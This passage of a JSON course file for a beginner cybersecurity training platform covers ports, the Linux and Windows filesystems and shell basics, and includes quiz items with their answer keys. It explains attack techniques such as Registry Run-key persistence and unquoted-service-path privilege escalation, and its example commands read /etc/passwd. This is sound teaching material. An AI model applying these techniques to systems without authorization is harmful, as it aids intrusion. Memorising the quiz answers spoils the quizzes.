          "SYN -> SYN-ACK -> ACK establishes state"
        ],
        "commands": [
          {
            "cmd": "ss -ta",
            "desc": "List all active TCP sockets and connection states (ESTABLISHED, LISTEN, TIME_WAIT)"
          },
          {
            "cmd": "ss -ua",
            "desc": "List active UDP sockets"
          }
        ],
        "guidedExercise": "Use ss -ta to view currently established TCP connections on your machine.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-04-1",
            "type": "exact",
            "question": "What flag does a server send back in response to an initial TCP SYN packet?",
            "visualSlots": "_ _ _ - _ _ _",
            "acceptedAnswers": [
              "SYN-ACK",
              "SYN/ACK",
              "SYN ACK"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Synchronize-Acknowledgment flag combination.",
            "explanation": "The server acknowledges the client's SYN and synchronizes its own sequence number with SYN-ACK."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Common Ports & Service Identification",
        "concept": "Port numbers (0 to 65535) direct incoming network packets to the specific application listening on a host. Ports 0\u20131023 are Well-Known System Ports; 1024\u201349151 are Registered Ports; 49152\u201365535 are Ephemeral/Dynamic Ports.\nCommon core security ports include:\n- **21:** FTP (File Transfer Protocol)\n- **22:** SSH (Secure Shell)\n- **25:** SMTP (Mail routing)\n- **53:** DNS (Domain Name System)\n- **80:** HTTP (Web unencrypted)\n- **443:** HTTPS (Web encrypted with TLS)\n- **3389:** RDP (Remote Desktop)",
        "whyItMatters": "Penetration testers perform port scanning (e.g. Nmap) to discover open doors and running services.",
        "examples": [
          "Port 22: Remote administrative shell",
          "Port 53: UDP name resolution",
          "Port 443: Web traffic secured with TLS"
        ],
        "commands": [
          {
            "cmd": "ss -tulpn",
            "desc": "Show listening TCP/UDP ports with associated process names and PIDs"
          },
          {
            "cmd": "nc -zv 1.1.1.1 53",
            "desc": "Check if port 53 is open on 1.1.1.1"
          }
        ],
        "guidedExercise": "Run ss -tulpn to check what network services are listening locally.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-04-2",
            "type": "exact",
            "question": "Which standard port number is assigned to Secure Shell (SSH) remote administrative access?",
            "visualSlots": "_ _",
            "acceptedAnswers": [
              "22"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "The default port for secure command-line administration.",
            "explanation": "Port 22 is the standard IANA assigned port for SSH."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Port Security & Final Knowledge Review",
        "concept": "Every open port is a potential attack surface. If an outdated daemon (like OpenSSH or Apache) with a known vulnerability listens on an open port, an attacker can send exploit payloads directly over the network. Firewalls (like iptables, nftables, or UFW) block unauthorized ports at the perimeter.",
        "whyItMatters": "Defenders minimize attack surface by closing all unnecessary listening ports.",
        "examples": [
          "UFW allow 22/tcp: Allow SSH only",
          "UFW default deny incoming: Drop unsolicited traffic",
          "Nmap -sS: Half-open stealth SYN scan"
        ],
        "commands": [
          {
            "cmd": "sudo ufw status",
            "desc": "Check host firewall status and port rules"
          },
          {
            "cmd": "cat /etc/services | grep -E 'ssh|http'",
            "desc": "Look up official IANA port numbers"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "TCP 3-way handshake, UDP connectionless datagrams, well-known port numbers, and listening socket inspection.",
          "technicalTakeaways": "TCP guarantees reliable delivery; UDP prioritizes speed. Open ports represent listening software services and potential attack vectors.",
          "commandsCovered": [
            "ss -tulpn",
            "nc -zv",
            "netstat",
            "ufw status"
          ],
          "commonMistakes": "Thinking UDP performs a handshake, or confusing IP addresses with application port numbers.",
          "learningOutcome": "You can explain the TCP 3-way handshake, identify standard security ports (22, 53, 80, 443), and inspect listening services."
        },
        "questions": [
          {
            "id": "q-04-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Network Protocols and Ports?",
            "options": [
              "Differentiate connection-oriented TCP from connectionless UDP",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Differentiate connection-oriented TCP from connectionless UDP is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-04-1",
        "type": "exact",
        "question": "What flag does a server send back in response to an initial TCP SYN packet?",
        "visualSlots": "_ _ _ - _ _ _",
        "acceptedAnswers": [
          "SYN-ACK",
          "SYN/ACK",
          "SYN ACK"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Synchronize-Acknowledgment flag combination.",
        "explanation": "The server acknowledges the client's SYN and synchronizes its own sequence number with SYN-ACK."
      },
      {
        "id": "q-04-2",
        "type": "exact",
        "question": "Which standard port number is assigned to Secure Shell (SSH) remote administrative access?",
        "visualSlots": "_ _",
        "acceptedAnswers": [
          "22"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "The default port for secure command-line administration.",
        "explanation": "Port 22 is the standard IANA assigned port for SSH."
      },
      {
        "id": "q-04-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Network Protocols and Ports?",
        "options": [
          "Differentiate connection-oriented TCP from connectionless UDP",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Differentiate connection-oriented TCP from connectionless UDP is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: TCP vs UDP & The 3-Way Handshake",
        "instruction": "Use ss -ta to view currently established TCP connections on your machine.",
        "hints": [
          "Synchronize-Acknowledgment flag combination."
        ]
      },
      {
        "title": "Task 2: Common Ports & Service Identification",
        "instruction": "Run ss -tulpn to check what network services are listening locally.",
        "hints": [
          "The default port for secure command-line administration."
        ]
      },
      {
        "title": "Task 3: Port Security & Final Knowledge Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-05"
  },
  {
    "id": "room-05",
    "stageId": "pre-security",
    "stageTitle": "Pre-Security",
    "stageOrder": 1,
    "stage": 1,
    "level": 1,
    "levelTitle": "Pre-Security",
    "roomNumber": 5,
    "title": "Linux Fundamentals",
    "description": "Master the operating system of cybersecurity: the hierarchical Linux filesystem, core directory roles, and essential file commands.",
    "difficulty": "Beginner",
    "difficultyBadge": "Beginner",
    "estimatedTime": "30 mins",
    "xpReward": 50,
    "prerequisites": "room-04",
    "whyAreYouHere": "Master the operating system of cybersecurity: the hierarchical Linux filesystem, core directory roles, and essential file commands.",
    "objectives": [
      "Navigate the inverted tree filesystem from root (/)",
      "Explain the roles of /etc, /var/log, /home, /bin, and /proc",
      "Manage files and directories (touch, mkdir, cp, mv, rm)",
      "Inspect file contents with cat, head, tail, and less"
    ],
    "skillsGained": [
      "Filesystem Architecture",
      "Linux Directory Structure",
      "File Operations",
      "Log Inspection"
    ],
    "toolsAndCommands": [
      "ls -la",
      "cd",
      "pwd",
      "cat",
      "tail -n 20"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: The Linux Filesystem Hierarchy Standard (FHS)",
        "concept": "In Linux, everything is organized under a single inverted tree starting at the root directory (`/`). Unlike Windows drive letters (`C:\\`, `D:\\`), all partitions and virtual filesystems mount into directories under `/`.\nKey security directories include:\n- `/etc`: System-wide configuration files (e.g. `/etc/passwd`, `/etc/shadow`)\n- `/var/log`: System, authentication, and service log files\n- `/bin` & `/sbin`: Essential executable binaries and system management utilities\n- `/home`: User home directories where personal files and shell history reside\n- `/proc` & `/sys`: Pseudo-filesystems exposing kernel memory, process states, and hardware parameters in real-time.",
        "whyItMatters": "Cybersecurity professionals spend most of their time examining /etc configurations and /var/log forensic evidence.",
        "examples": [
          "/etc/passwd: Lists all system accounts and login shells",
          "/var/log/auth.log: Records SSH login attempts and sudo events",
          "/proc/version: Live kernel version running in RAM"
        ],
        "commands": [
          {
            "cmd": "pwd",
            "desc": "Print Current Working Directory"
          },
          {
            "cmd": "ls -la /",
            "desc": "List all root directories with hidden files, permissions, and owners"
          }
        ],
        "guidedExercise": "Run ls -la / to inspect the primary directories of the Linux filesystem.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-05-1",
            "type": "exact",
            "question": "Which directory stores system configuration files such as user accounts and network settings?",
            "visualSlots": "/ _ _ _",
            "acceptedAnswers": [
              "/etc",
              "etc"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Short three-letter folder under root.",
            "explanation": "/etc contains all core system and service configuration files in Linux."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: File Manipulation & Navigation",
        "concept": "Working in Linux requires rapid filesystem manipulation. Essential commands include:\n- `cd <path>`: Change directory (`cd ..` moves up one level; `cd ~` goes home)\n- `mkdir -p <dir>`: Create directories (creates parent paths if missing)\n- `touch <file>`: Create an empty file or update timestamps\n- `cp -r <src> <dest>`: Copy files or directories recursively\n- `mv <src> <dest>`: Move or rename files\n- `rm -rf <path>`: Remove files or directories recursively (use with caution!).",
        "whyItMatters": "Attackers stage malware payloads in writable directories like `/tmp` or `/dev/shm`.",
        "examples": [
          "mkdir -p /tmp/recon/scans: Create nested folders",
          "cp /etc/hosts /tmp/hosts.bak: Backup a configuration file",
          "mv old.txt new.txt: Rename a file"
        ],
        "commands": [
          {
            "cmd": "touch /tmp/testfile",
            "desc": "Create a dummy file in the volatile temporary directory"
          },
          {
            "cmd": "rm /tmp/testfile",
            "desc": "Delete the temporary test file"
          }
        ],
        "guidedExercise": "Navigate to /tmp and create a directory named calion-test.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-05-2",
            "type": "exact",
            "question": "Which command-line command is used to display your current working directory path?",
            "visualSlots": "_ _ _",
            "acceptedAnswers": [
              "pwd"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Stands for Print Working Directory.",
            "explanation": "pwd prints the absolute path of your current location in the filesystem."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Viewing File Contents & Final Knowledge Review",
        "concept": "Linux provides specialized utilities to inspect file content without GUI editors:\n- `cat <file>`: Print the entire file to terminal output\n- `head -n 10 <file>`: View the first 10 lines of a file\n- `tail -n 10 <file>`: View the last 10 lines of a file (use `-f` to follow live log appends)\n- `less <file>`: Interactive terminal pager allowing forward and backward scrolling with `/` search.",
        "whyItMatters": "Monitoring authentication logs in real time with `tail -f` reveals live brute-force attacks.",
        "examples": [
          "tail -f /var/log/auth.log: Watch incoming SSH authentication attempts live",
          "head -n 5 /etc/passwd: Check root and daemon system account entries"
        ],
        "commands": [
          {
            "cmd": "head -n 5 /etc/passwd",
            "desc": "View first 5 system accounts"
          },
          {
            "cmd": "tail -n 5 /etc/services",
            "desc": "View last 5 port mappings"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Inverted tree filesystem (/), FHS directory roles (/etc, /var/log, /proc), and basic file management commands.",
          "technicalTakeaways": "Linux treats everything as a file. Knowing where logs (/var/log) and configs (/etc) reside is crucial for both security auditing and incident investigation.",
          "commandsCovered": [
            "pwd",
            "ls -la",
            "cd",
            "mkdir",
            "touch",
            "cp",
            "mv",
            "rm",
            "cat",
            "tail"
          ],
          "commonMistakes": "Confusing relative paths with absolute paths starting with '/', or accidentally deleting files with unverified rm commands.",
          "learningOutcome": "You can navigate the Linux directory tree, locate system configurations and logs, and manipulate files cleanly from the shell."
        },
        "questions": [
          {
            "id": "q-05-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Linux Fundamentals?",
            "options": [
              "Navigate the inverted tree filesystem from root (/)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Navigate the inverted tree filesystem from root (/) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-05-1",
        "type": "exact",
        "question": "Which directory stores system configuration files such as user accounts and network settings?",
        "visualSlots": "/ _ _ _",
        "acceptedAnswers": [
          "/etc",
          "etc"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Short three-letter folder under root.",
        "explanation": "/etc contains all core system and service configuration files in Linux."
      },
      {
        "id": "q-05-2",
        "type": "exact",
        "question": "Which command-line command is used to display your current working directory path?",
        "visualSlots": "_ _ _",
        "acceptedAnswers": [
          "pwd"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Stands for Print Working Directory.",
        "explanation": "pwd prints the absolute path of your current location in the filesystem."
      },
      {
        "id": "q-05-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Linux Fundamentals?",
        "options": [
          "Navigate the inverted tree filesystem from root (/)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Navigate the inverted tree filesystem from root (/) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: The Linux Filesystem Hierarchy Standard (FHS)",
        "instruction": "Run ls -la / to inspect the primary directories of the Linux filesystem.",
        "hints": [
          "Short three-letter folder under root."
        ]
      },
      {
        "title": "Task 2: File Manipulation & Navigation",
        "instruction": "Navigate to /tmp and create a directory named calion-test.",
        "hints": [
          "Stands for Print Working Directory."
        ]
      },
      {
        "title": "Task 3: Viewing File Contents & Final Knowledge Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-06"
  },
  {
    "id": "room-06",
    "stageId": "pre-security",
    "stageTitle": "Pre-Security",
    "stageOrder": 1,
    "stage": 1,
    "level": 1,
    "levelTitle": "Pre-Security",
    "roomNumber": 6,
    "title": "Windows Fundamentals",
    "description": "Explore Windows operating system architecture, the Registry, NTFS security permissions, and core administrative services.",
    "difficulty": "Beginner",
    "difficultyBadge": "Beginner",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-05",
    "whyAreYouHere": "Explore Windows operating system architecture, the Registry, NTFS security permissions, and core administrative services.",
    "objectives": [
      "Understand Windows architecture (User Mode vs Kernel Mode, Win32 subsystem)",
      "Navigate the Windows Registry hierarchy (HKLM, HKCU, HKU)",
      "Explain NTFS Access Control Lists (ACLs) and security descriptors",
      "Inspect active processes and Windows Services"
    ],
    "skillsGained": [
      "Windows Architecture",
      "Registry Analysis",
      "NTFS Permissions",
      "Windows Services"
    ],
    "toolsAndCommands": [
      "whoami /priv",
      "systeminfo",
      "net user",
      "sc query"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Windows Architecture & The Registry",
        "concept": "The Windows NT architecture divides into User Mode (subsystems, service processes, applications) and Kernel Mode (Executive, microkernel, Hardware Abstraction Layer / HAL). The central repository for all Windows configuration settings is the **Windows Registry**, structured into hives:\n- `HKEY_LOCAL_MACHINE (HKLM)`: System-wide hardware and OS configurations\n- `HKEY_CURRENT_USER (HKCU)`: Settings for the currently logged-in user\n- `HKEY_USERS (HKU)`: Profiles for all user accounts on the machine\n- `HKEY_CLASSES_ROOT (HKCR)`: File extension associations and COM registrations.",
        "whyItMatters": "Adversaries establish persistence on Windows by writing malicious executables into Registry Run keys (`HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`).",
        "examples": [
          "Run Key: Starts malware automatically upon user login",
          "SAM Hive: Security Account Manager storing local password hashes"
        ],
        "commands": [
          {
            "cmd": "whoami",
            "desc": "Display domain or computer name and current username"
          },
          {
            "cmd": "systeminfo",
            "desc": "Output OS build version, hotfixes, and system architecture"
          }
        ],
        "guidedExercise": "Inspect basic system properties and user context.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-06-1",
            "type": "exact",
            "question": "Which Windows Registry hive contains hardware, driver, and system-wide security settings applied to all users?",
            "visualSlots": "_ _ _ _",
            "acceptedAnswers": [
              "HKLM",
              "HKEY_LOCAL_MACHINE"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Four-letter acronym starting with HK.",
            "explanation": "HKLM (HKEY_LOCAL_MACHINE) stores configuration data common to all users and hardware."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: NTFS Permissions & Access Control Lists",
        "concept": "The NT File System (NTFS) secures files and folders using **Discretionary Access Control Lists (DACLs)** consisting of Access Control Entries (ACEs). Each ACE grants or denies specific permissions (Read, Write, Execute, Full Control) to a Security Identifier (SID). In Windows, User Account Control (UAC) ensures administrators run in standard user tokens until elevated privileges are explicitly approved.",
        "whyItMatters": "Misconfigured folder permissions (e.g., Everyone: Full Control on service binaries) allow low-privilege users to replace legitimate services with malware.",
        "examples": [
          "SID S-1-5-18: LocalSystem (highest OS privilege)",
          "SID S-1-5-32-544: Administrators group",
          "icacls: Windows utility to view and modify folder ACLs"
        ],
        "commands": [
          {
            "cmd": "whoami /priv",
            "desc": "List Windows security tokens and user privileges (e.g. SeDebugPrivilege)"
          },
          {
            "cmd": "net user",
            "desc": "List all local Windows user accounts"
          }
        ],
        "guidedExercise": "Execute whoami /priv to view the privilege tokens assigned to your session.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-06-2",
            "type": "multiple-choice",
            "question": "What is the highest-privileged local security identity in the Windows operating system?",
            "options": [
              "Standard User",
              "NT AUTHORITY\\SYSTEM (LocalSystem)",
              "Guest",
              "Remote Desktop Users"
            ],
            "correctIndex": 1,
            "hint": "The operating system core runs under this account.",
            "explanation": "NT AUTHORITY\\SYSTEM has complete control over the local Windows machine, higher than a normal Administrator."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Windows Services & Final Knowledge Review",
        "concept": "Windows Services are long-running background executables managed by the Service Control Manager (SCM). Services run without an interactive user login, frequently running under the powerful `SYSTEM` identity. If a service binary path is unquoted with spaces (e.g., `C:\\Program Files\\My Service\\run.exe`), an attacker can place an executable at `C:\\Program.exe` to achieve privilege escalation.",
        "whyItMatters": "Service persistence and unquoted service paths are among the most common Windows attack techniques.",
        "examples": [
          "sc query: Check status of running Windows services",
          "Get-Service: PowerShell cmdlet to query service states"
        ],
        "commands": [
          {
            "cmd": "sc query type= service",
            "desc": "Enumerate active Windows services"
          },
          {
            "cmd": "net start",
            "desc": "List running Windows network services"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Windows NT kernel vs user mode, Registry hives (HKLM/HKCU), NTFS DACLs/SIDs, and Windows Services.",
          "technicalTakeaways": "Registry Run keys and misconfigured service permissions are primary vectors for persistence and privilege escalation on Windows.",
          "commandsCovered": [
            "whoami /priv",
            "systeminfo",
            "net user",
            "sc query"
          ],
          "commonMistakes": "Confusing HKLM with HKCU, or assuming local Administrator has higher kernel privilege than SYSTEM.",
          "learningOutcome": "You can navigate Windows architecture, explain Registry persistence mechanisms, and audit user privilege tokens."
        },
        "questions": [
          {
            "id": "q-06-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Windows Fundamentals?",
            "options": [
              "Understand Windows architecture (User Mode vs Kernel Mode, Win32 subsystem)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Understand Windows architecture (User Mode vs Kernel Mode, Win32 subsystem) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-06-1",
        "type": "exact",
        "question": "Which Windows Registry hive contains hardware, driver, and system-wide security settings applied to all users?",
        "visualSlots": "_ _ _ _",
        "acceptedAnswers": [
          "HKLM",
          "HKEY_LOCAL_MACHINE"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Four-letter acronym starting with HK.",
        "explanation": "HKLM (HKEY_LOCAL_MACHINE) stores configuration data common to all users and hardware."
      },
      {
        "id": "q-06-2",
        "type": "multiple-choice",
        "question": "What is the highest-privileged local security identity in the Windows operating system?",
        "options": [
          "Standard User",
          "NT AUTHORITY\\SYSTEM (LocalSystem)",
          "Guest",
          "Remote Desktop Users"
        ],
        "correctIndex": 1,
        "hint": "The operating system core runs under this account.",
        "explanation": "NT AUTHORITY\\SYSTEM has complete control over the local Windows machine, higher than a normal Administrator."
      },
      {
        "id": "q-06-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Windows Fundamentals?",
        "options": [
          "Understand Windows architecture (User Mode vs Kernel Mode, Win32 subsystem)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Understand Windows architecture (User Mode vs Kernel Mode, Win32 subsystem) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Windows Architecture & The Registry",
        "instruction": "Inspect basic system properties and user context.",
        "hints": [
          "Four-letter acronym starting with HK."
        ]
      },
      {
        "title": "Task 2: NTFS Permissions & Access Control Lists",
        "instruction": "Execute whoami /priv to view the privilege tokens assigned to your session.",
        "hints": [
          "The operating system core runs under this account."
        ]
      },
      {
        "title": "Task 3: Windows Services & Final Knowledge Review",
        "instruction": "Review and complete the guided exercise in the interactive sandbox.",
        "hints": [
          "Reflect on the primary learning objective of this room."
        ]
      }
    ],
    "nextRoomId": "room-07"
  },
  {
    "id": "room-07",
    "stageId": "pre-security",
    "stageTitle": "Pre-Security",
    "stageOrder": 1,
    "stage": 1,
    "level": 1,
    "levelTitle": "Pre-Security",
    "roomNumber": 7,
    "title": "Command-Line Fundamentals",
    "description": "Unlock the full power of the shell: input/output redirection, pipes, grep pattern filtering, and command chaining.",
    "difficulty": "Beginner",
    "difficultyBadge": "Beginner",
    "estimatedTime": "35 mins",
    "xpReward": 50,
    "prerequisites": "room-05",
    "whyAreYouHere": "Unlock the full power of the shell: input/output redirection, pipes, grep pattern filtering, and command chaining.",
    "objectives": [
      "Master Standard Input (stdin), Standard Output (stdout), and Standard Error (stderr)",
      "Chain commands using pipes (|) to build data analysis pipelines",
      "Filter and search text streams using grep and regular expressions",
      "Automate workflows with command chaining (&&, ||, ;)"
    ],
    "skillsGained": [
      "I/O Redirection",
      "UNIX Pipelines",
      "Text Filtering with Grep",
      "Command Chaining"
    ],
    "toolsAndCommands": [
      "grep -i",
      "cut -d",
      "sort",
      "uniq -c",
      "wc -l"
    ],
    "lessons": [
      {
        "taskNumber": 1,
        "title": "Task 1: Standard Streams & Redirection (<, >, >>, 2>)",
        "concept": "In POSIX operating systems, every process starts with three standardized I/O streams:\n- `0 (stdin)`: Standard Input (keyboard/input stream)\n- `1 (stdout)`: Standard Output (normal output stream)\n- `2 (stderr)`: Standard Error (diagnostic/error stream).\nYou can redirect streams using shell operators:\n- `>`: Overwrite file with stdout (e.g. `ls > list.txt`)\n- `>>`: Append stdout to file without destroying existing contents\n- `2>`: Redirect stderr specifically (e.g. `find / -name flag 2>/dev/null` silences Permission Denied errors)\n- `&>`: Redirect both stdout and stderr simultaneously.",
        "whyItMatters": "Suppressing error messages with `2>/dev/null` is standard practice when searching restricted filesystems.",
        "examples": [
          "command > out.log: Overwrite out.log with stdout",
          "command >> out.log: Append to out.log",
          "command 2>/dev/null: Discard errors to the null device"
        ],
        "commands": [
          {
            "cmd": "echo 'CALION Academy' > /tmp/academy.txt",
            "desc": "Write text to file using redirection"
          },
          {
            "cmd": "cat /tmp/academy.txt",
            "desc": "Verify written file contents"
          }
        ],
        "guidedExercise": "Redirect command output to /tmp/test.txt and inspect it with cat.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-07-1",
            "type": "exact",
            "question": "Which redirection operator appends command output to the end of a file without overwriting it?",
            "visualSlots": "> >",
            "acceptedAnswers": [
              ">>"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Two greater-than symbols side by side.",
            "explanation": ">> appends output to the destination file, while > overwrites it."
          }
        ]
      },
      {
        "taskNumber": 2,
        "title": "Task 2: Pipes (|) & The Grep Pattern Matcher",
        "concept": "The pipe operator (`|`) routes the stdout of one program directly into the stdin of the next. This enables complex data pipelines from simple tools. The essential tool in any pipeline is `grep` (Global Regular Expression Print), which filters lines matching a pattern:\n- `grep -i <pattern>`: Case-insensitive search\n- `grep -v <pattern>`: Invert match (show lines that do NOT match)\n- `grep -r <pattern> <dir>`: Recursively search files inside a directory\n- `wc -l`: Count total output lines.",
        "whyItMatters": "Security analysts use grep pipelines to sift through millions of log lines in seconds.",
        "examples": [
          "cat /var/log/auth.log | grep -i 'failed password': Find failed logins",
          "ps aux | grep python: Locate running Python processes",
          "ss -tulpn | grep ':80': Check if port 80 is listening"
        ],
        "commands": [
          {
            "cmd": "cat /etc/passwd | grep -i 'root'",
            "desc": "Find lines mentioning root in account file"
          },
          {
            "cmd": "ls /bin | wc -l",
            "desc": "Count total binaries in /bin"
          }
        ],
        "guidedExercise": "Use a pipe to filter and count running processes with ps aux | wc -l.",
        "isFinalReview": false,
        "reviewSummary": null,
        "questions": [
          {
            "id": "q-07-2",
            "type": "exact",
            "question": "Which grep flag inverts the search to return only lines that do NOT match the specified pattern?",
            "visualSlots": "- _",
            "acceptedAnswers": [
              "-v",
              "v"
            ],
            "caseSensitive": false,
            "trimWhitespace": true,
            "hint": "Single letter flag for inVerted match.",
            "explanation": "grep -v inverts matching, displaying all lines that do not contain the pattern."
          }
        ]
      },
      {
        "taskNumber": 3,
        "title": "Task 3: Command Chaining (&&, ||, ;) & Final Knowledge Review",
        "concept": "You can chain multiple commands on a single line:\n- `;`: Sequential execution regardless of success or failure (`cmd1 ; cmd2`)\n- `&&`: Logical AND; runs `cmd2` only if `cmd1` exited successfully with status 0 (`make && sudo make install`)\n- `||`: Logical OR; runs `cmd2` only if `cmd1` failed with non-zero exit status (`ping -c 1 host || echo 'Host down'`).",
        "whyItMatters": "Command injection vulnerabilities occur when web apps concatenate user inputs directly into shell chaining operators.",
        "examples": [
          "mkdir /tmp/lab && cd /tmp/lab: Only change directory if creation succeeded",
          "curl -s http://target || echo 'Offline': Fallback notification on failure"
        ],
        "commands": [
          {
            "cmd": "echo 'Step 1' && echo 'Step 2'",
            "desc": "Execute chained commands conditionally"
          },
          {
            "cmd": "false || echo 'Fallback executed'",
            "desc": "Execute fallback after failed exit code"
          }
        ],
        "guidedExercise": "Review and complete the guided exercise in the interactive sandbox.",
        "isFinalReview": true,
        "reviewSummary": {
          "mainConcepts": "Standard streams (stdin, stdout, stderr), redirection operators (>, >>, 2>), pipelines (|), and grep filtering.",
          "technicalTakeaways": "Redirecting stderr to /dev/null suppresses clutter during searches. Piping into grep, sort, and uniq enables rapid log triage.",
          "commandsCovered": [
            "grep",
            "wc -l",
            "sort",
            "uniq",
            "cut"
          ],
          "commonMistakes": "Accidentally overwriting a critical file with '>' instead of appending with '>>'.",
          "learningOutcome": "You can construct shell pipelines, redirect streams cleanly, and extract actionable indicators from raw log streams."
        },
        "questions": [
          {
            "id": "q-07-3",
            "type": "multiple-choice",
            "question": "Which key technical concept best summarizes your learning in Command-Line Fundamentals?",
            "options": [
              "Master Standard Input (stdin), Standard Output (stdout), and Standard Error (stderr)",
              "Ignoring operating system permissions and error logs",
              "Executing unauthorized attacks against production networks without scope",
              "Using plaintext passwords on unencrypted networks"
            ],
            "correctIndex": 0,
            "hint": "Reflect on the primary learning objective of this room.",
            "explanation": "Understanding Master Standard Input (stdin), Standard Output (stdout), and Standard Error (stderr) is the central takeaway of this room."
          }
        ]
      }
    ],
    "questions": [
      {
        "id": "q-07-1",
        "type": "exact",
        "question": "Which redirection operator appends command output to the end of a file without overwriting it?",
        "visualSlots": "> >",
        "acceptedAnswers": [
          ">>"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Two greater-than symbols side by side.",
        "explanation": ">> appends output to the destination file, while > overwrites it."
      },
      {
        "id": "q-07-2",
        "type": "exact",
        "question": "Which grep flag inverts the search to return only lines that do NOT match the specified pattern?",
        "visualSlots": "- _",
        "acceptedAnswers": [
          "-v",
          "v"
        ],
        "caseSensitive": false,
        "trimWhitespace": true,
        "hint": "Single letter flag for inVerted match.",
        "explanation": "grep -v inverts matching, displaying all lines that do not contain the pattern."
      },
      {
        "id": "q-07-3",
        "type": "multiple-choice",
        "question": "Which key technical concept best summarizes your learning in Command-Line Fundamentals?",
        "options": [
          "Master Standard Input (stdin), Standard Output (stdout), and Standard Error (stderr)",
          "Ignoring operating system permissions and error logs",
          "Executing unauthorized attacks against production networks without scope",
          "Using plaintext passwords on unencrypted networks"
        ],
        "correctIndex": 0,
        "hint": "Reflect on the primary learning objective of this room.",
        "explanation": "Understanding Master Standard Input (stdin), Standard Output (stdout), and Standard Error (stderr) is the central takeaway of this room."
      }
    ],
    "tasks": [
      {
        "title": "Task 1: Standard Streams & Redirection (<, >, >>, 2>)",
        "instruction": "Redirect command output to /tmp/test.txt and inspect it with cat.",
        "hints": [
          "Two greater-than symbols side by side."
        ]
      },
      {
        "title": "Task 2: Pipes (|) & The Grep Pattern Matcher",
